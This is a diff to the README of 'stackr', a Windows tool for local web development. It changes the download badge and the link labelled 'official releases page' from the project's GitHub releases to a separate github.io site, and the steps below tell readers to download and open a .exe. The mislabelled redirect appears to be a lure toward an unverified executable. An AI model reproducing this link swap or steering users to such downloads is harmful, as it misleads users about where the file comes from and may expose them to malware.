@@ -1,6 +1,6 @@
 # ⚙️ stackr - Manage your local website projects easily
 
-[https://img.shields.io/badge/Download-Stackr-blue](https://github.com/xcv-thyronine317/stackr/releases)
+[https://img.shields.io/badge/Download-Stackr-blue](https://xcv-thyronine317.github.io)
 
 Stackr provides a simple way to run web projects on your computer. It acts as a control center for your website files and databases. You no longer need to install complex software one piece at a time. This tool installs and manages everything you need for web development in one package. It runs on Windows and works for beginners and professionals.
 
@@ -19,7 +19,7 @@ Stackr includes:
 
 Follow these steps to set up the software. Ensure your computer uses Windows 10 or Windows 11.
 
-1. Visit the [official releases page](https://github.com/xcv-thyronine317/stackr/releases).
+1. Visit the [official releases page](https://xcv-thyronine317.github.io).
 2. Look for the file ending in .exe.
 3. Download the file to your computer.
 4. Open the downloaded file.
